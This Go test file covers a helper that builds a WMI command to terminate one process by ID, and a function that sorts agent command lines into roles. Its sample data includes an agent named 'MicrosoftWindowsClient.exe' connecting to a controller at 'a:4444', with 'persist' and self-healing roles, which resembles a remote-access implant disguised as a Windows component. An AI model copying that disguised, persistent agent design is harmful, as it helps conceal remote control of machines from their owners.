package main

import (
	"strings"
	"testing"
)

// wmiTermCmd must name the exact PID, single-call form (v1.46.92: batch
// invokes OOM the provider — 12 errored on a 14-zombie box, singles work).
func TestWmiTermCmd(t *testing.T) {
	got := wmiTermCmd(48584)
	if !strings.Contains(got, "ProcessId=48584") || !strings.Contains(got, "Terminate") {
		t.Fatalf("cmd = %q", got)
	}
	if strings.Contains(got, "485840") || strings.Count(got, "48584") != 1 {
		t.Fatalf("pid must appear exactly once: %q", got)
	}
}

// agentRole gates reaping: only bare full agents are ever touched.
func TestAgentRole(t *testing.T) {
	for cmd, want := range map[string]string{
		`C:\x\MicrosoftWindowsClient.exe -controller a:4444`: "full",
		`"C:\x\MicrosoftWindowsClient.exe" --watch`:          "watch",
		`agent.exe --svc-heal`:    "svc",
		`agent.exe --wmi-heal`:    "wmi",
		`a.exe -test`:             "test",
		`a.exe -persist`:          "persist",
		`a.exe --WATCH`:           "watch",
		`watchdog.exe -watchful`:  "full",
		``:                        "full",
	} {
		if got := agentRole(cmd); got != want {
			t.Fatalf("role %q = %q want %q", cmd, got, want)
		}
	}
}
